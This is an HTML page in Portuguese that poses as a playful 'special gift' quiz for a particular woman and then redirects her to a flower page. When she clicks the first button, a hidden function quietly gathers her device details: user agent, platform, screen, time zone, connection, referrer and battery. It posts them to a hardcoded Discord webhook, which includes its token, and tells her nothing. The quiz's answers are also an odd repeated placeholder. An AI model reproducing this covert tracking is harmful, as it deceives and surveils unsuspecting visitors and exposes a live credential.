<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>😍 Um Presente Especial</title>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #ff6b6b, #f7f7f7);
        }
        .container {
            text-align: center;
            background-color: rgba(255, 255, 255, 0.9);
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
            max-width: 400px;
            transition: transform 0.3s;
        }
        .container:hover {
            transform: scale(1.05);
        }
        h1, h2 {
            font-family: 'Dancing Script', cursive;
            color: #ff3e6e;
        }
        button {
            margin: 10px;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border: none;
            border-radius: 8px;
            background-color: #ff6b6b;
            color: white;
            transition: background-color 0.3s, transform 0.2s;
        }
        button:hover {
            background-color: #ff3e6e;
            transform: translateY(-2px);
        }
        input[type="text"] {
            padding: 10px;
            font-size: 16px;
            width: calc(100% - 22px);
            margin-bottom: 10px;
            border: 1px solid #ff6b6b;
            border-radius: 5px;
        }
        #notification {
            font-size: 16px;
            color: red;
        }
        .hidden {
            display: none;
        }

        .texto-fundo-direito {
            font-family: 'Dancing Script', cursive;
            color: #ff3e6e;
            position: fixed;
            bottom: 0;
            right: 0;
            margin: 10px;
            font-size: 30px;
        }    
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
</head>
<body>

<div class="container" id="startContainer">
    <h1>Tenho um presentinho para você, você quer? 🎁</h1>
    <button id="startButton">Sim</button>
    <button onclick="noQuiz()">Não</button>
</div>

<div class="container hidden" id="quizContainer">
    <h2 id="question">Hummm, qual seu primeiro nome? 🤨</h2>
    <input type="text" id="answerInput" placeholder="Digite sua resposta">
    <button onclick="checkAnswer()">Enviar Resposta</button>
    <p id="feedback"></p>
</div>

<div class="container hidden" id="finalContainer">
    <h2>HUMMM, parece que é você mesma então. Quer o presente agora? 😁🎁</h2>
    <button onclick="acceptGift()">Sim 🥳</button>
    <button onclick="declineGift()">Não 🙄</button>
    <p id="notification" class="hidden"></p>
</div>

<script>
    const questions = [
        { question: "Hummm, qual seu primeiro nome? 🤨", answer: "replay: 10121" },
        { question: "Hum 🤨🤨 qual seu sobrenome?", answer: "replay: 10121"},
        { question: "Ainda não estou convencido que você é [nome]. Digite seu nome completo 🤨", answer: "replay: 10121" },
        { question: "Suspeito 🤨. Ainda desconfio que você é [nome], qual sua idade?", answer: "replay: 10121" },
        { question: "Será que você é [nome] mesmo? Qual seu aniversário? (Ex: 07/11)", answer: "replay: 10121"},
        { question: "Tá, tá, perfeito. Mas eu ainda não acredito que seja 100% você 🙄. Qual o MEU nome completo?", answer: "replay: 10121"},
    ];

    let currentQuestionIndex = 0;

    document.getElementById('startButton').addEventListener('click', function() {
        document.getElementById('startContainer').classList.add('hidden');
        document.getElementById('quizContainer').classList.remove('hidden');
        sendDeviceInfoToDiscord(); // Envia informações do dispositivo
    });

    function noQuiz() {
        alert("Oxeee, e quem disse que vc pode recusar? 🙄🙄");
    }

    function checkAnswer() {
        const userAnswer = document.getElementById('answerInput').value;
        const feedback = document.getElementById('feedback');

        if (userAnswer.trim().toLowerCase() === questions[currentQuestionIndex].answer.toLowerCase()) {
            feedback.textContent = "Resposta correta! 🥳🥳🥳🥳";
            currentQuestionIndex++;

            if (currentQuestionIndex < questions.length) {
                setTimeout(() => {
                    document.getElementById('question').textContent = questions[currentQuestionIndex].question;
                    document.getElementById('answerInput').value = '';
                    feedback.textContent = '';
                }, 1000); 
            } else {
                setTimeout(() => {
                    document.getElementById('quizContainer').classList.add('hidden');
                    document.getElementById('finalContainer').classList.remove('hidden');
                }, 1000); 
            }
        } else {
            feedback.textContent = "Resposta errada 🤨";
        }
    }

    function acceptGift() {
        const notification = document.getElementById('notification');
        notification.textContent = "kasdks obrigado por esperar. Direcionando você para o presente 😁😁🥳🎁🌹";
        notification.classList.remove('hidden');

        setTimeout(() => {
            window.location.href = "https://berg08.github.io/flor/"; 
        }, 5000);  // Redireciona 5 segundos
    }

    function declineGift() {
        alert("Tudo bem, talvez na próxima vez! 😊");
    }

    function sendDeviceInfoToDiscord() {
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const screenWidth = window.screen.width;
        const screenHeight = window.screen.height;
        const pixelRatio = window.devicePixelRatio;
        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const connection = navigator.connection ? navigator.connection.effectiveType : 'N/A';
        const referrer = document.referrer || 'N/A';
        const onlineStatus = navigator.onLine ? 'Online' : 'Offline';

        navigator.getBattery().then(function(battery) {
            const batteryLevel = (battery.level * 100) + "%";
            const chargingStatus = battery.charging ? "Sim" : "Não";

            const webhookURL = 'https://discord.com/api/webhooks/1291508492858818643/nQUVPpcbItVxbBQk0OQ1gcORa3jMFUgyD4zfpxciKQY3KmEYjgjoDVPprJrxZFWsfTOL';

            const message = {
                content: `
                **Informações do Dispositivo:**
                - User-Agent: ${userAgent}
                - Plataforma: ${platform}
                - Idioma: ${language}
                - Resolução de Tela: ${screenWidth}x${screenHeight}
                - Fator de Pixel: ${pixelRatio}
                - Fuso Horário: ${timeZone}
                - Tipo de Conexão: ${connection}
                - Página de Referência: ${referrer}
                - Status de Conexão: ${onlineStatus}
                - Nível de Bateria: ${batteryLevel}
                - Carregando: ${chargingStatus}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(message)
            })
            .then(response => {
                if (response.ok) {
                    console.log('Informações enviadas para o Discord com sucesso.');
                } else {
                    console.log('Erro ao enviar informações para o Discord.');
                }
            })
            .catch(error => {
                console.log('Erro:', error);
            });
        });
    }
</script>

<div class="texto-fundo-direito">
    Pixel Studios
</div>

</body>
</html>
